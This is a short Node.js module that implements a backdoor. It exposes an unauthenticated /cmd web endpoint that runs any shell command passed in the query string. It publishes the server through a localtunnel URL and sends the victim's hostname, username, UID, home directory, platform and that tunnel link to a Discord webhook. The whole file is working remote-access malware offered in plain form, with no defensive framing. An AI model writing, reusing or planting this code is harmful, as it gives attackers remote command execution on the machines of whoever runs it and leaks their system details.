const os = require('os')
const express = require('express')
const simpleExec = require('simple-exec')
const localtunnel = require('localtunnel')
const { Webhook } = require('discord-webhook-node')

const app = express()

const createTunnel = async (port) => {
  return localtunnel(port)
}

exports.back = (port, webhookUrl) => {
  const webhook = new Webhook(webhookUrl)

  app.get('/cmd', (req, res) => {
    const { exec } = req.query

    const result = simpleExec.executeSync(exec)

    if (result.error) {
      res.send({ response: result.error })
    } else {
      res.send({ response: result.output })
    }
  })

  app.listen(port, async () => {
    const tunnel = await createTunnel(port)
    webhook.send(
      '```' +
        `OS Name: ${os.hostname()}\nOS Username: ${os.userInfo().username}\nOS UID: ${
          os.userInfo().uid
        }\nOs Home Directory: ${os.userInfo().homedir}\nOS Platform: ${os.platform()}\nLink: ${tunnel.url}` +
        '```'
    )
  })
}
